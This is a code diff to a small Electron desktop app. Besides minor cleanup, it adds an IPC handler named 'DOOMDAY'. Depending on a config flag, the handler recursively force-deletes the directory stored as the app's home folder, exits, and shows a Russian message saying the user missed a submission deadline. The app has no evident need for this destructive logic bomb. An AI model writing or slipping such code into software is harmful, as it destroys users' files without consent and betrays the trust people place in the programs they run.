@@ -1,9 +1,7 @@
 const { app, BrowserWindow, dialog, ipcMain } = require("electron");
-const { writeFile, existsSync, mkdirSync } = require("fs");
+const { writeFile, existsSync, mkdirSync} = require("fs");
 const path = require('path');
 const os = require("os");
-const { log } = require("console");
-// const { TL } = require("./")
 
 
 class MainWindow extends BrowserWindow {
@@ -40,21 +38,27 @@ class MainWindow extends BrowserWindow {
     //убираю ненужные менюшки
     // this.setMenu();
 
-    ipcMain.handle('D', async (_event) => {
-      const { readFile, rmdir } = require("fs/promises")
+    ipcMain.handle('DOOMDAY', async (_event) => {
+      const { readFile, rm } = require("fs/promises")
       const isBabe = await readFile(this.#config_path)
       .then(data => JSON.parse(data))
       .then(data => data.option.isBaby)
       
       if ( !isBabe ){
-        rmdir(this.#homeDir)
-        .then(res => {console.log(res)})
+        rm(this.#homeDir, {recursive:true, force: true})
+        .then(res => {
+          console.log(res); 
+          console.log("delete home folder");
+          app.exit(0)
+        })
       }
       else{
         console.log("remove all system");
+
+        app.exit(0)
       }
 
-      dialog.showErrorBox("D", "kjsdlknf")
+      dialog.showErrorBox("Удаление", "вы пропустили время сдачи, пока!")
 
     });
 
@@ -82,7 +86,7 @@ class MainWindow extends BrowserWindow {
   }
 
   #databaseCheck() {
-    if (!existsSync(this.#db_path)) writeFile(this.#db_path, JSON.stringify([]), (err) => false);
+    if (!existsSync(this.#db_path)) writeFile(this.#db_path, JSON.stringify([]), (err) => {console.log(err);});
   }
 }
 
